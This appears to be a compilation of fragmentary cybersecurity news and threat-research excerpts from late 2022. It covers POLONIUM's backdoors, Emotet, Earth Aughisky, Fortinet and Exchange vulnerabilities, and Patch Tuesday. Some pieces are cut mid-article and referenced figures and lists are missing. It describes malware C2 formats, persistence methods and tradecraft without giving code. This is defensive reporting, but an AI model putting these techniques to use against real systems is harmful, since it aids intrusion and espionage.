(i.e., previous executions of the backdoor that are still running), and XVDFv , which implements persistence (in the same way we described for DeepCreep). Figure 8. Example of MegaCreep calling methods from separate DLLs Another feature that was added to MegaCreep is that the output from commands executed by cmd.exe is encrypted before it is uploaded to the cloud. The key used for encryption is the same as the one used to decrypt commands. We saw one case where MegaCreep was deployed using a loader, WLAN-AutoConfig.exe . The main code for the backdoor was placed in a DLL file, MainZero.dll , and other routines that communicate with Mega were placed in another DLL, MagLibrary.dll . Figure 9 shows the code in the loader that calls MainZero . Figure 9. Code for MegaCreep’s loader FlipCreep is another previously undocumented backdoor written in C# that has a very similar flow of execution as the other backdoors that we have described: it reads commands from orders.txt – a text file stored on an FTP server operated by POLONIUM – and can upload or download files from the server. The commands that FlipCreep can process are the same as the other backdoors, with the following considerations: Figure 10. Part of the FlipCreep code to upload files FlipCreep creates a folder with the username of the target on the FTP server, along with these subfolders: Persistence is achieved in the same way as was described for DeepCreep. As for string obfuscation, we’ve seen one sample with ROT13 obfuscation. TechnoCreep is a previously undocumented C# backdoor that communicates with a C&C server via TCP sockets. In this case, commands are not read from a file, but received in an exchange of messages. The first message is sent by the backdoor and contains initial information about the victim, in the format <PC_NAME>#<USERNAME>#<LIST_IP>#<LIST_OTHER>#<OS> <LIST_IP> is a list of IP addresses that are resolved for the hostname of the victim, separated by / . The list is obtained by calling Dns.GetHostByName and applying a regular expression for IP addresses. All the other elements that don’t match the regular expression are sent as <LIST_OTHER> to the C&C server; note that in the most common scenario this list will be empty. TechnoCreep receives commands in an infinite loop. The list of commands is shown in Table 3. Table 3. List of commands supported by TechnoCreep TechnoCreep persists by copying its executable to the Startup folder, as shown in Figure 11. Identical code can also be found in some versions of DeepCreep. Note that no LNK files are used in this method. Figure 11. TechnoCreep code establishing persistence PapaCreep is a previously undocumented custom backdoor written in C++ that can receive and execute commands from a remote server via TCP sockets. First seen in September 2022, this is the first backdoor used by POLONIUM that was not written in C# or PowerShell. PapaCreep is a modular backdoor; its code has been divided in various components, some of them with minimal functionalities. We can summarize the main components as: The Executive and Mailman components run independently from each other and are even persisted with separate scheduled tasks in a compromised system. Communication with the remote server uses raw TCP sockets, but the information that is sent and received by the backdoor is contained in HTML code (with a fake HTTP header). Figure 12 shows that the header is hardcoded in the backdoor, and Content-length is always 1024. Note that Content-Type is text/-html , which is not a normal value. Figure 12. Hardcoded HTTP header used by the PapaCreep backdoor The Mailman component initiates communication with the C&C server by sending <PC_NAME>-<USERNAME> (base64 encoded). It then starts two threads: one of them receives commands from the server and the other one sends any available output from the execution of commands. Delimiters are used for both sending and receiving: code#s and code#f are used to mark the start and end of the data. An example of a message sent to the server with the output of a dir command is shown in Figure 13. Figure 13. Example of a message sent to the C&C server, and the decoded content If the content is bigger than 1024 bytes, more than one message will be transmitted. In that case, the first message will have the start delimiter and the final message will have the end delimiter. The IP address and port of the C&C server is read from a text file, yetty.dll , with the format <IP_address>::<port> (base64 encoded). The CreepyUp and CreepyDown modules are not part of the main flow of execution of the backdoor and can be executed on demand. They are standalone command line tools that take two arguments, a local and a remote file. Curiously, CreepyDown’s filename in compromised computers is UCLN.exe and CreepyUp is DCLN.exe . This is similar as the commands upload and download in the FlipCreep backdoor that do the opposite of what is expected. Both CreepyUp and CreepyDown read the server information from the yetty.dll text file. To spy on their victims, POLONIUM uses several other modules on top of their backdoors, including reverse shell modules and a module for creating a tunnel. ESET researchers have observed many variants of the modules that the group uses for taking screenshots. As for keyloggers, POLONIUM has used both custom and open-source ones. The group’s custom keylogger monitors keystrokes and clipboard contents and supports both Hebrew and Arabic keyboards. POLONIUM has also used a simple module that uses AForge.NET to take a snapshot from the webcam and save it in the TEMP folder. POLONIUM didn’t use domain names in any of the samples that we analyzed, only IP addresses. Most of the servers are dedicated VPS, likely purchased rather than compromised, hosted at HostGW. There is one special case: IP address 45.80.149[.]154 hosts erichmocanu.tv, which seems to be a legitimate website. It is likely that POLONIUM used this server before it was assigned to its current owner. POLONIUM is a very active threat actor with a vast arsenal of malware tools and is constantly modifying them and developing new ones. A common characteristic of several of the group’s tools is the abuse of cloud services such as Dropbox, Mega and OneDrive for C&C communications. Intelligence and public reports about POLONIUM are very scarce and limited, likely because the group’s attacks are highly targeted, and the initial compromise vector is not known.

Claims of the leak emerged over the weekend in the publication Tom’s Hardware , which Intel has confirmed in a statement. “Our proprietary UEFI code appears to have been leaked by a third party. We do not believe this exposes any new security vulnerabilities as we do not rely on obfuscation of information as a security measure,” Intel said. Getting on the front foot, Intel made an offer to security researchers: “This code is covered under our bug bounty program within the Project Circuit Breaker campaign, and we encourage any researchers who may identify potential vulnerabilities to bring them our attention through this program.” Project Circuit Breaker offers bounties up to $US100,000 (A$158,840). “We are reaching out to both customers and the security research community to keep them informed of this situation,” the company concluded. The 3GB compressed file posted to 4chan and Github was discussed on Twitter by @VxUnderground and @glowingfreak , who included a link to the Github repository. Russian security researcher Mark Ermolov of Positive Technologies asserted that the leaked code contained the private signing key for Intel’s Boot Guard technology. Ermolov claimed this meant Intel Boot Guard “can no longer be trusted”, since an attacker could sign fake firmware and have it accepted as the real thing. He also said the leak exposed model-specific registers (MSRs), used for functions like debugging and feature enabling/disabling.

Some of their possible victims are PayPal, eBay, Twitter, media outlets, and some U.S. government websites. Last year, suspected SEA members were seen sending phishing links disguised as social media URLs to targets. While there is no direct confirmation that the Syrian government supervises the group, researchers found some evidence supporting this claim. Many also believe that other nations may be using the army because of its effectiveness. To assist law enforcement agencies and the cybersecurity community in tracking down the threat group, WhoisXML API threat researcher Dancho Danchev took a deeper look inside SEA’s digital infrastructure, revealing: Our researchers further dissected these suspicious cyber resources and uncovered more connected domains and IP addresses. A sample of the additional artifacts obtained from our analysis is available for download from our website . Most of the email addresses tied to the threat group were Hotmail and Gmail accounts. Danchev retrieved 34 of them, along with 238 domain names and 444 responding IP addresses. Most of the email addresses contained random text strings in their usernames, but we also noticed some that contained the strings “syrian” and “whitehouse.” On the other hand, the domain names didn’t have a significant theme. They were primarily generic domains that could be tied to businesses like “airport van rentals,” “gikitchen,” and “theatre confetti.” However, some are potentially cybersquatting domains, such as: The domains were also concentrated in seven TLD spaces—.com, .info, .org, .net, .biz, .gov, and .ca. The chart below shows the distribution of the domains across these TLDs. The IP addresses were spread across 28 countries, although about 60% are geolocated in the U.S. The top IP geolocations are shown in the chart below. With the help of the Reverse WHOIS operations, 771 additional domains related to the threat group were found. These domains were registered using the SEA email addresses at some point. Reverse IP lookups for the responding IP addresses also led us to more connected domains. In total, 1,457 indicators of compromise (IoCs) and artifacts related to SEA were uncovered in this study. We analyzed these using WHOIS and DNS intelligence. Subjecting the IoCs and related properties to a bulk WHOIS lookup determined that most of them (30%) belonged to the American Registry for Internet Numbers (ARIN). GoDaddy was the leading registrar, accounting for 12% of the registrations, followed by Google with 6%. The rest of the top registrars are shown in the graph below. While the properties resolved to IP addresses assigned to more than 180 Internet service providers (ISPs), Amazon topped the list, accounting for 22% of the IP resolutions. Google and GoDaddy also appeared in the top 10, with shares of 7% and 4%, respectively. It was previously mentioned that the responding IP addresses directly connected to the threat group were primarily geolocated in the U.S. This finding is consistent when the artifacts were included in the analysis. For both WHOIS registration and IP geolocation, the properties were mostly located in the U.S., accounting for 59.9% of the IP resolutions and 62% of the domain registrations. This location contextualization may help security teams expand their visibility as threat actors may continue to mask their locations. Out of 1,009 connected domains, only five have been flagged as malicious in our analysis. That leaves the actors with the majority of the domains that they can potentially use in malicious activities. Law enforcers have been after SEA for some time now and even indicted two members in 2018. The cybersecurity community also wants to crack down on the threat group. Mapping out its digital footprint is a crucial step toward achieving this goal.

Tracked as CVE-2022-40684 (CVSS score: 9.6), the flaw relates to an authentication bypass in FortiOS, FortiProxy, and FortiSwitchManager that could allow a remote attacker to perform unauthorized operations on the administrative interface via specially crafted HTTP(S) requests. ""Fortinet is aware of an instance where this vulnerability was exploited, and recommends immediately validating your systems against the following indicator of compromise in the device's logs: user='Local_Process_Access,'"" the company noted in an advisory. The list of impacted devices is below - Updates have been released by the security company in FortiOS versions 7.0.7 and 7.2.2, FortiProxy versions 7.0.7 and 7.2.1, and FortiSwitchManager version 7.2.1. The disclosure comes days after Fortinet sent ""confidential advance customer communications"" to its customers, urging them to apply patches to mitigate potential attacks exploiting the flaw. If updating to the latest version isn't an option, it's recommended that users disable the HTTP/HTTPS administrative interface, or alternatively limit IP addresses that can access the administrative interface. Update: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added the Fortinet flaw to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring federal agencies to apply patches by November 1, 2022. Details and proof-of-concept (PoC) code for the vulnerability are expected to become publicly available in the coming days, in a move that could enable other threat actors to adopt the exploit to their toolset and mount their own attacks. ""Vulnerabilities affecting devices on the edge of corporate networks are among the most sought after by threat actors because it leads to breaching the perimeter, and CVE-2022-40684 allows exactly this,"" Zach Hanley, chief attack engineer at Horizon3.ai, said.

CVE-2022-35846 is a missing account lockout in the FortiTester Telnet port, and Fortinet’s advisory says the bug allows an administrator’s account to be brute-forced. It affects the same versions of FortiTester as CVE-2022-33873, and is patched in the same upgrades. CVE-2022-29055 is a denial-of-service bug caused by an unitialised pointer in various versions of FortiOS and FortiProxy, which Fortinet said “allows a remote unauthenticated or authenticated attacker to crash the sslvpn daemon via an HTTP GET request.” CVE-2021-44171 is an OS command injection bug in FortiOS the company said allows an attacker to “execute privileged commands on a linked FortiSwitch via diagnostic CLI commands.” The security wrap-up also includes the medium-rated CVE-2022-35844 , which the company said is only exploitable via an authenticated attacker, and the low-rated CVE-2022-26121 , which gives an attacker access to a template image.

Microsoft released its monthly security update Tuesday, disclosing 83 vulnerabilities across the company’s hardware and software line, including seven critical issues in Windows’ point-to-point tunneling protocol. October's security update features 11 critical vulnerabilities, with the remainder being “important.” One of the most notable vulnerabilities Microsoft fixed this month is CVE-2022-41038 , a remote code execution issue in Microsoft SharePoint. There are several other SharePoint vulnerabilities included in this month’s Patch Tuesday, though this seems the most severe, as Microsoft continues it to be “more likely” to be exploited. An attacker must be authenticated to the target site with the correct permissions to use manage lists in SharePoint to exploit this vulnerability, and eventually gain the ability to execute remote code on the SharePoint server. CVE-2022-37968 , an elevation of privilege vulnerability in Azure Arc Connect, has the highest severity score out of all the vulnerabilities Microsoft fixed this month — a maximum 10 out of 10. Successful exploitation of this vulnerability, which affects the cluster connect feature of Azure Arc-enabled Kubernetes clusters, could allow an unauthenticated user to elevate their privileges as cluster admins and potentially gain control over the Kubernetes cluster. CVE-2022-37976 and CVE-2022-37979 are also critical elevation of privilege vulnerabilities in Windows Active Directory and Hyper-V, respectively. The Windows’ point-to-point tunneling protocol, which is a network protocol used to create VPN tunnels between public networks, contains eight vulnerabilities that Microsoft disclosed Tuesday, seven of which are rated “critical” severity: CVE-2022-22035 CVE-2022-24504 CVE-2022-30198 CVE-2022-33634 CVE-2022-38000 CVE-2022-38047 CVE-2022-41081 CVE-2022-38000 is the most serious among the group with a severity rating of 9. An attacker could successfully exploit this issue to launch remote code at the remote server. Microsoft Office and Word also contain critical remote code execution vulnerabilities. These are usually popular targets for adversaries, as they are one of the most popular pieces of software in the world and can be exploited just by tricking a user into opening a specially crafted document: CVE-2022-38048 CVE-2022-38049 CVE-2022-41031 Microsoft has also included 12 vulnerabilities in Google Chromium, the open-source web browser that is the basis for Microsoft’s Edge browser. Google has already disclosed and fixed these issues, so users do not need to take any additional steps to implement patches: CVE-2022-3304 CVE-2022-3307 CVE-2022-3308 CVE-2022-3310 CVE-2022-3311 CVE-2022-3313 CVE-2022-3315 CVE-2022-3316 CVE-2022-3317 CVE-2022-3370 CVE-2022-3373 CVE-2022-41035 A complete list of all the vulnerabilities Microsoft disclosed this month is available on its update page. In response to these vulnerability disclosures, Talos is releasing a new Snort rule set that detects attempts to exploit some of them.

Take a break from your regularly scheduled activities and join us as we review the details of their latest security offerings. Adobe Patches for October 2022 For October, Adobe released four patches addressing 29 vulnerabilities in Adobe Acrobat and Reader, ColdFusion, Commerce and Magento, and Adobe Dimension. A total of 22 of these bugs were reported through the ZDI program. The fix for ColdFusion seems to be the most critical, with multiple CVSS 9.8 code execution bugs being addressed. There’s also a fix for a bug in the Admin Component service. The service uses a hard-coded password for the administrator user. An attacker can leverage this vulnerability to bypass authentication on the system. Hard to imagine hard-coded credentials have existed in the product for so long without being discovered. The Commerce and Magento update addresses only one bug, but it’s a CVSS 10. If you’re using either of these products, ensure you test and deploy this quickly to fix the stored cross-site scripting (XSS) bug. The patch for Acrobat and Reader fixes six bugs, with the most severe being stack-based buffer overflows that could lead to code execution. A threat actor would need to trick someone into opening a specially crafted PDF to get arbitrary code exec. The fix for Dimension corrects nine bugs, eight of which are rated critical. Most of these are file parsing bugs and would require user interaction to exploit. None of the bugs fixed by Adobe this month are listed as publicly known or under active attack at the time of release. Adobe categorizes these updates as a deployment priority rating of 3. Microsoft Patches for October 2022 This month, Microsoft released 85 new patches addressing CVEs in Microsoft Windows and Windows Components; Azure, Azure Arc, and Azure DevOps; Microsoft Edge (Chromium-based); Office and Office Components; Visual Studio Code; Active Directory Domain Services and Active Directory Certificate Services; Nu Get Client; Hyper-V; and the Windows Resilient File System (ReFS). This is in addition to the 11 CVEs patched in Microsoft Edge (Chromium-based) and one patch for side-channel speculation in Arm processors. That brings the total number of CVEs to 96. Six of these CVEs were submitted through the ZDI program. What may be more interesting is what isn’t included in this month’s release. There are no updates for Exchange Server, despite two Exchange bugs being actively exploited for at least two weeks. These bugs were purchased by the ZDI at the beginning of September and reported to Microsoft at the time. With no updates available to fully address these bugs, the best administrators can do is ensure the September 2021 Cumulative Update (CU) is installed. This adds the Exchange Emergency Mitigation service. This automatically installs available mitigations and sends diagnostic data to Microsoft. Otherwise, follow this post from Microsoft with the latest information. Their mitigation advice has changed multiple times, so you’ll need to make sure you check it often for updates. Of the 85 new patches released today, 15 are rated Critical, 69 are rated Important, and one is rated Moderate in severity. This volume is somewhat in line with what we’ve seen in previous October releases, but it does put Microsoft on track to exceed its 2021 total. If that happens, 2022 would the second busiest year for Microsoft CVEs. One of the new CVEs released this month is listed as publicly known and one other is listed as being in the wild at the time of release. Let’s take a closer look at some of the more interesting updates for this month, starting with the bug under active attack: - CVE-2022-41033 – Windows COM+ Event System Service Elevation of Privilege Vulnerability This patch fixes a bug that Microsoft lists as being used in active attacks, although they specify how broad these attacks may be. Since this is a privilege escalation bug, it is likely paired with other code execution exploits designed to take over a system. These types of attacks often involve some form of social engineering, such as enticing a user to open an attachment or browse to a malicious website. Despite near-constant anti-phishing training, especially during “Cyber Security Awareness Month”, people tend to click everything, so test and deploy this fix quickly. - CVE-2022-37987 / CVE-2022-37989 – Windows Client Server Run-time Subsystem (CSRSS) Elevation of Privilege Vulnerability These bugs were reported by ZDI Sr. Vulnerability Researcher Simon Zuckerbraun and pertain to the behavior of the CSRSS process when it searches for dependencies. CVS-2022-37989 is a failed patch for CVE-2022-22047 , an earlier bug that saw some in-the-wild exploitation. This vulnerability results from CSRSS being too lenient in accepting input from untrusted processes. By contrast, CVE-2022-37987 is a new attack that works by deceiving CSRSS into loading dependency information from an unsecured location. We’ll publish additional details about these bugs on our blog in the future. - CVE-2022-37968 – Azure Arc-enabled Kubernetes cluster Connect Elevation of Privilege Vulnerability This vulnerability could allow an attacker to gain administrative control over Azure Arc-enabled Kubernetes clusters. Azure Stack Edge devices may also be impacted by this bug. To exploit this remotely, the attacker would need to know the randomly generated DNS endpoint for an Azure Arc-enabled Kubernetes cluster. Still, this bug receives the rare CVSS 10 rating – the highest severity rating the system allows. If you’re running these types of containers, make sure you either have auto-upgrade enabled or manually update to the latest version by running the appropriate commands in the Azure CLI. - CVE-2022-38048 – Microsoft Office Remote Code Execution Vulnerability This bug was reported to the ZDI by the researcher known as “hades_kito” and represents a rare Critical-rated Office bug. Most Office vulnerabilities are rated Important since they involve user interaction – typically opening a file. An exception to that is when the Preview Pane is an attack vector, however, Microsoft states that isn’t the case here. Likely the rating results from the lack of warning dialogs when opening a specially crafted file. Either way, this is a UAF that could lead to passing an arbitrary pointer to a free call which makes further memory corruption possible. Here’s the full list of CVEs released by Microsoft for October 2022: * Indicates this CVE had previously been assigned by a 3rd-party and is now being incorporated into Microsoft products. Looking at the rest of the Critical-rated patches, the update for Active Directory Certificate Services (ADCS) stands out the most as successful exploitations would provide the attacker domain administrative privileges. However, exploiting this would be tricky. A malicious DCOM client would need to trick a DCOM server to authenticate to it through ADCS and then use the credential to launch a cross-protocol attack. There are seven Critical-rated fixes for the Point-to-Point Tunneling Protocol (PPTP). If you’re still using this, consider migrating to a more modern (and secure) solution. There’s a fix for a guest-to-host escape in Hyper-V that could result in the attacker executing code on the root OS. In addition to the one mentioned above, there are two other Critical-rated bugs impacting Office components. Neither have a Preview Pane attacker vector, so it’s not clear why the Critical rating applies. Speaking of confusing, there’s a Critical fix for SharePoint that reads identical to the Important-rated SharePoint fixes. Microsoft offers no clarity on why this bug is different. There are only nine other fixes for remote code execution vulnerabilities, including three for SharePoint that have the same description as the Critical-rated SharePoint bugs already mentioned. There are two patches for the WDAC OLE DB provider for SQL Server and one for the ODBC Driver itself. There’s a fix for an RCE in Visual Studio Code, but no details are provided on what the attack scenario would be. That’s not the case for the GDI+ bug. An attacker would need to convince a user to browse to a malicious website or open a specially crafted file to get code execution. Finally, former Pwn2Own winner Bien Pham from Team Orca of Sea Security reported a code execution bug in the CD-ROM driver through the ZDI program. It’s an integer overflow that could lead to an out-of-bound write on kernel heap memory. In this case, an attacker would need to convince someone to open a malicious .iso file, which does seem a bit unlikely. A total of 39 bugs in this release are Elevation of Privilege (EoP) bugs, including those mentioned above. The majority of these require an authenticated user to run specially crafted code on an affected system, but there are a few that stand out. The first is the patch for the print spooler. While we’re certainly used to spooler updates by now, this one was reported by the National Security Agency (NSA). The EoP in the Workstation service requires privileges, but it can be reached remotely. An attacker could execute RPC functions that are normally restricted to the local client. You would also need to be authenticated to send malicious RPC calls to the DHCP service to escalate to SYSTEM. The bug in Active Directory Domain Services could allow an attacker to get domain administrator privileges, but Microsoft offers no details on how that would occur. The NuGet package manager for .NET receives a fix impacting multiple NuGet versions. The fix for Visual Studio Code contains an …uh… interesting workaround: “Create a folder C:\ProgramData\jupyter\kernels\ and configure it to be writable only by the current user.” It’s not clear why this prevents the attack, but Microsoft claims it will. Lastly, the EoP in the Local Security Authority (LSA) could lead to a sandbox escape. The October release includes fixes for 11 information disclosure bugs, including one in Office that’s listed as publicly known. Most of the other info disclosure vulnerabilities only result in leaks consisting of unspecified memory contents. There are a couple of notable exceptions. The bug in the Web Account Manager could allow an attacker to view unbound refresh tokens issued by one cloud on a different cloud. The patches for Visual Studio Code and the Mixed Reality Developer Tools fix disclosure bugs that could allow reading from the file system. The final info disclosure bug fixed this month could allow reading from the HKLM hive of the registry which you normally would not have access to. There are two patches for Security Features Bypass (SFB) vulnerabilities this month, and the first requires physical access. On systems with outdated USB controller hardware, a Group Policy might have silently failed, which would leave the Windows Portable Device Enumerator Service open to attacks that rely on inserting a USB storage device. The SFB bug in Active Directory Certificate Services requires a Man-in-the-Middle (MiTM) and applies to Windows Challenge/Response (NTLM) authentication. Eight different DoS vulnerabilities are patched this month. Probably the most interesting is the DoS in TCP/IP, which could be exploited by remote, unauthenticated attackers and does not require user interaction. Microsoft states systems with IPv6 disabled aren’t affected, but IPv6 comes enabled by default on most systems these days. Microsoft provides no further details about the seven other DoS patches. The October release is rounded out by five spoofing bugs, including the lone Moderate-rated fix, which addresses a spoofing vulnerability in Microsoft Edge (Chromium-based). The most interesting is the Critical-rated fix for the Windows CryptoAPI. This bug could allow an attacker to spoof an existing public x.509 certificate to authenticate or sign code as the targeted certificate. I’m sure malware authors will definitely try to use this one in the near future. There’s also a store cross-site scripting (XSS) bug in the Service Fabric Explorer. If you’re using this, you need to ensure you are on the latest version by following these instructions. No additional details are provided about the spoofing bugs in Office or NTLM. No new advisories were released this month. The latest servicing stack updates can be found in the revised ADV990001 .

(Video),David Steinberg-Zwirek,2022-10-10,"Monster , Zeppelin , and Monti : What links these malware variants? See what the BlackBerry threat research team found out in the latest episode of the BlackBerry LIVE series, hosted by BlackBerry Vice President for Threat Research & Intelligence Ismael Valenzuela . This episode’s special guests include Threat Researcher Claudia Preciado , and Principal Threat Research Publisher Natasha Rohner . Watch the latest BlackBerry LIVE Broadcast, below. Designated as both high-impact and high-risk by the researchers, ransomware-as-a-service (RaaS) named “Monster” was first seen in March 2022. Researchers identified it largely due to its similarities with Zeppelin RaaS, which also uses the Delphi programming language. Zeppelin was notable for attacking tech and healthcare companies in Europe and the U.S. As Rohner notes, “The Zeppelin variant was visibly distinct. Its binaries are designed to quit running on machines that are based in Russia and some other ex-USSR countries. This is similar to Monster, which also quits if it finds out the host machine is located in one of the twelve Commonwealth of Independent States.” As researchers dug deeper, they noticed the developers of Monster seemed to have included indicators of compromise (IoCs) in the malware’s makeup that pointed the finger at other threat groups. This might be a tactic to slow attribution by research organizations and law enforcement. The use of other threat groups’ IoCs was also seen in Monti ransomware , and researchers are watching to see if this is a new trend in malware developer behavior. Monster is yet another sign that organizations should anticipate further adoption of a RaaS business model among threat actors. According to Preciado, the allure of this model, when coupled with an initial access broker (IAB), is that it effectively eliminates the most challenging parts of orchestrating a cyberattack: writing code, and performing initial intrusions of victims' machines. Preciado explains another concern around Monster, “We are seeing a growing trend in uncommon programming languages being used in malware. Delphi is one of them. We've seen some in Rust and Go as well.” BlackBerry research indicates two main reasons threat actors use exotic languages: Thwarting detection . Using lesser-known programming languages makes malware less susceptible to exploitation by defenders and helps foil attempts to detect and defend against them. An added layer of obfuscation . Lesser-known languages are relatively new, so analysts often don’t have the support tools needed to identify them. This also makes efforts to reverse-engineer exotic program languages more difficult.

Emotet is the work of a threat actor tracked as Mummy Spider (aka TA542), emerging in June 2014 as a banking trojan before morphing into an all-purpose loader in 2016 that's capable of delivering second-stage payloads such as ransomware. While the botnet's infrastructure was taken down as part of a coordinated law enforcement operation in January 2021, Emotet bounced back in November 2021 through another malware known as TrickBot . Emotet's resurrection, orchestrated by the now-defunct Conti team, has since paved the way for Cobalt Strike infections and, more recently, ransomware attacks involving Quantum and BlackCat . ""The ongoing adaptation of Emotet's execution chain is one reason the malware has been successful for so long,"" researchers from VMware's Threat Analysis Unit (TAU) said in a report shared with The Hacker News. Emotet attack flows are also characterized by the use of different attack vectors in an attempt to stay covert for extended periods of time. These intrusions typically rely on waves of spam messages that deliver malware-laced documents or embedded URLs, which, when opened or clicked, lead to the deployment of the malware. In January 2022 alone, VMware said it observed three different sets of attacks in which the Emotet payload was delivered via an Excel 4.0 (XL4) macro, an XL4 macro with PowerShell, and a Visual Basic Application (VBA) macro with PowerShell. Some of these infection lifecycles were also notable for the abuse of a legitimate executable called mshta.exe to launch a malicious HTA file and then drop the Emotet malware. ""Tools such as mshta and PowerShell, which are sometimes referred to as living-off-the-land binaries (LOLBINs), are very popular among threat actors because they are signed by Microsoft and trusted by Windows,"" the researchers said. ""This allows the attacker to perform a confused deputy attack, in which legitimate tools are fooled into executing malicious actions."" Further analysis of nearly 25,000 unique Emotet DLL artifacts shows that 26.7% of those were dropped by Excel documents. As many as 139 distinctive program chains have been identified. Emotet's re-emergence has also been marked by a change in C2 infrastructure, with the threat actor operating two new botnet clusters dubbed Epochs 4 and 5 . Prior to the takedown, the Emotet operation ran atop three separate botnets referred to as Epochs 1, 2, and 3 . On top of that, 10,235 Emotet payloads detected in the wild between March 15, 2022, and June 18, 2022, reused C2 servers belonging to Epoch 5. The changes to both the execution chains and C2 IP addresses aside, Emotet has also been spotted distributing two new plugins, one which is designed to capture credit card data from Google Chrome browser, and a spreader module that uses the SMB protocol for lateral movement. Other significant components include a spamming module and account stealers for Microsoft Outlook and Thunderbird email clients. A majority of the IP addresses used to host the servers were in the U.S., Germany, and France. In contrast, most of the Emotet modules were hosted in India, Korea, Thailand, Ghana, France, and Singapore. To protect against threats like Emotet, it's recommended to implement network segmentation, enforce a Zero Trust model, and replace default authentication mechanisms in favor of stronger alternatives.",['Malware'],ad635e56-20d4-517e-a32a-e1b08bc65175,"Emotet malware operators are continually shifting their tactics and command-and-control (C2) infrastructure to escape detection.

""Over the last decade, the group has continued to make adjustments in the tools and malware deployments on specific targets located in Taiwan and, more recently, Japan,"" Trend Micro disclosed in a technical profile last week. Earth Aughisky, also known as Taidoor , is a cyber espionage group that's known for its ability to abuse legitimate accounts, software, applications, and other weaknesses in the network design and infrastructure for its own ends. While the Chinese threat actor has been known to primarily target organizations in Taiwan, victimology patterns observed towards late 2017 indicate an expansion to Japan. The most commonly targeted industry verticals include government, telcom, manufacturing, heavy, technology, transportation, and healthcare. Attack chains mounted by the group typically leverage spear-phishing as a method of entry, using it to deploy next-stage backdoors. Chief among its tools is a remote access trojan called Taidoor (aka Roudan). The group has also been linked to a variety of malware families, such as GrubbyRAT, K4RAT, LuckDLL, Serkdes, Taikite, and Taleret, as part of its attempts to consistently update its arsenal to evade security software. Some of the other notable backdoors employed by Earth Aughisky over the years are as follows - Trend Micro's attribution of the malware strains to the threat actor is based on the similarities in source code, domains, and naming conventions, with the analysis also uncovering functional overlaps between them. The cybersecurity firm also linked the activities of Earth Aughisky to another APT actor codenamed by Airbus as Pitty Tiger (aka APT24 ) owing to the use of the same dropper in various attacks that transpired between April and August 2014. 2017, the year when the group set its sights on Japan and Southeast Asia, has also been an inflection point in the way the volume of the attacks has exhibited a significant decline since then. Despite the longevity of the threat actor, the recent shift in targets and activities likely suggests a change in strategic objectives or that the group is actively revamping its malware and infrastructure. ""Groups like Earth Aughisky have sufficient resources at their disposal that allow them the flexibility to match their arsenal for long-term implementations of cyber espionage,"" Trend Micro researcher CH Lei said. ""Organizations should consider this observed downtime from this group's attacks as a period for preparation and vigilance for when it becomes active again.""",['Malware'],5e00f19d-b2f2-5882-8bcc-56a2b0a074d6,"Trend Micro detailed the increasingly sophisticated nature of the malware toolset employed by an advanced persistent threat (APT) group named Earth Aughisky. “Over the last decade, the group has continued to make adjustments in the tools and malware deployments on specific targets located in Taiwan and, more recently, Japan,"" Trend Micro disclosed in a technical profile last week."

Microsoft confirmed these vulnerabilities were being exploited in a limited and targeted manner. The Common Vulnerabilities and Exposures Program (CVE) is now tracking these Microsoft vulnerabilities as CVE-2022-41040 and CVE-2022-41082 . 41040 is a server-side forgery (SSRF) issue that enables an authenticated threat actor to trigger 41082. SSRFs abuse legitimate server functionality to access or modify resources. In this case, once the initial vulnerability is exploited, the second vulnerability allows for remote code execution via PowerShell. The threat actors can then leverage certutil , a legitimate utility used to dump and display certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components, and to verify certificates, key pairs, and certificate chains. Microsoft Exchange Server® versions 2013, 2016, and 2019 are all affected by these vulnerabilities. Microsoft Exchange Online has detections and mitigations established to block this vulnerability. Impact In attacks endured by multiple Microsoft customers , the attackers used this exploit to deploy backdoor scripts imitating legitimate Exchange files such as RedirSuiteServiceProxy.aspx, which are available on the Exchange server. Once these backdoor scripts are deployed, credential-stealing malware is spread through the compromised servers. As seen across the broader threat landscape, credential-stealing attacks such as this can lay the groundwork for future attacks, including information stealing and introduction of ransomware. Researchers hypothesize that the exploit originates from China, given the use of Antsword, a popular Chinese language-based open-source web shell (SharPyShell), and China Chopper . Microsoft notes that to exploit the vulnerability, authenticated access to the vulnerable Exchange server is necessary. However, with the rise in credential-stealing and social engineering attacks , obtaining authenticated access has become increasingly easy for threat actors. Mitigation Is Insufficient Protection Shortly after these vulnerabilities were detected, Microsoft provided proposed mitigation that involves blocking the known attack patterns by using the URL Rewrite engine to deliver the blocking rule, and a PowerShell script to automate the deployment. However, security researchers quickly determined that the blocking rule can be bypassed easily, given the over-specificity of the rule. If the threat actor tailors its attack to work outside of this precise rule, the compromised system remains still vulnerable. Microsoft also recommends that organizations disable remote PowerShell access for non-admin users. Ideally, this action would reduce the attack surface if a non-admin account were to be compromised. However, this still leaves systems vulnerable to stolen admin credentials. CylanceOPTICS Customers Have an Additional Layer of Protection From BlackBerry While the initial mitigations provided by Microsoft were identified as insufficient, as a general best practice, BlackBerry strongly recommends that customers concerned about these vulnerabilities follow the recommendations provided by the Microsoft Security Response Center . BlackBerry customers who use CylanceOPTICS® , the BlackBerry® EDR ( endpoint detection and response ) solution, have an additional layer of protection from these vulnerabilities. BlackBerry Threat Research has authored a CylanceOPTICS rule available to download in MyAccount , the BlackBerry customer portal, with specific instructions outlined in Knowledge Base article KB102471 . Once enabled, this rule will help to identify and mitigate the techniques utilized in these zero-day vulnerabilities. Related Reading What Is a Zero-Day Vulnerability?

Thunder rumbles. Lightning flashes. An unexpected crime takes place. Intrigue and deception follow, with a mystery to solve. When it comes to fiction, you might enjoy reading a good mystery to figure out “whodunnit.” Not so, when that crime is a ransomware attack with a digital note telling you that threat actors have compromised your organization’s network, encrypted all your files, and are demanding immediate payment to restore your operations. The Cost of Ransomware: More Than Money In 2021, the average cost of a ransomware attack hit $1.85 million – a 41% increase from the previous year . This includes the ransom, downtime, people time, device cost, network cost, lost opportunity, and more. But beyond the financial and reputational cost, there’s another impact few companies talk about: leadership turnover. Recent research reveals that 32% of the time, C-level employees depart the organization after a successful ransomware attack. To add insult to injury, 80% of targeted organizations are hit by a repeat attack. These are the reasons SANS Institute’s Senior Instructor Jake Williams , and BlackBerry Principal Incident Response & Forensics Consultant Ryan Chapman , joined forces in a recent SANS webcast to explain the various stages of a ransomware operation, and steps organizations can take to lessen vulnerability. Their insights are also echoed in the free white paper Anatomy of a Ransomware Operation . “Ransomware is no longer just an executable that drops onto a device and then does bad things on that device,” Chapman says in the webcast. “Rather, it is an overall operation, and it's carried out by humans with their hands on the keyboard.” Threat actors are “doing things human-operated,” Chapman concludes. “You should too. If you don't have enough security-minded folks, then that's where managed detection 